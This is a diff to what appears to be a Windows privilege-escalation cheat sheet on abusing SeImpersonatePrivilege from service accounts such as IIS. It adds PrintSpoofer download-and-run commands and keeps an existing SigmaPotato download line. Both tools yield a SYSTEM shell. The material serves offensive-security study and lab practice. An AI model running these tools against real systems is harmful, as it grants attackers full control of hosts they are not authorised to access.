@@ -13,7 +13,15 @@ In most configurations, IIS (Windows Webserver) will run as LocalService, LocalS
 
 This also applies to other Windows services.
 # SeImpersonatePrivilege
-To exploit this privilege, SigmaPotato (or other "potato" exploits) can be used to trick "NT AUTHORITY\SYSTEM" into authenticating into a malicious named pipe, allowing us to execute commands as them.
+## PrintSpoofer
+Objectively the best way to privesc this imo.
+```
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+```
+```
+PrintSpoofer64.exe -i -c cmd
+```
+## Potatoes
 ```bash
 wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
 ```
